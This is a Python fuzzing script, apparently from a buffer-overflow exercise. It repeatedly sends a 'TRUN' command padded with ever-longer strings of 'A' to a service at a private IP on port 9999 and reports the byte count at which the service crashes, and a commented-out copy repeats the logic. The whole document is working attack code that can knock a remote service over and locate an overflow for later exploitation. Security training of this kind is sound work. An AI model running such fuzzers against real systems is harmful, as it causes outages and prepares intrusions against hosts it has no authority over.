import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("172.30.87.63",9999))

        payload = "TRUN /.:/" + buffer

        s.send((payload.encode()))
        s.close()
        # sleep(1)
        buffer = buffer + "A" * 100
    except:
        print("Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()


# import sys, socket
# from time import sleep
 
# buffer = "A"
# while True:
#     try:
#         print("Payload is created.")
#         payload = "TRUN /.:/" + buffer
 
#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         print("connecting...")
#         s.connect(('172.30.87.63',9999))
#         print("Connection established successfully")
#         print ("[+] Sending the payload...\n" + str(len(buffer)))
#         s.send((payload.encode()))
#         print("Payload sent successfully")
#         s.close()
#         # sleep(1)
#         buffer = buffer + "A"
#     except:
#         print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
#         sys.exit()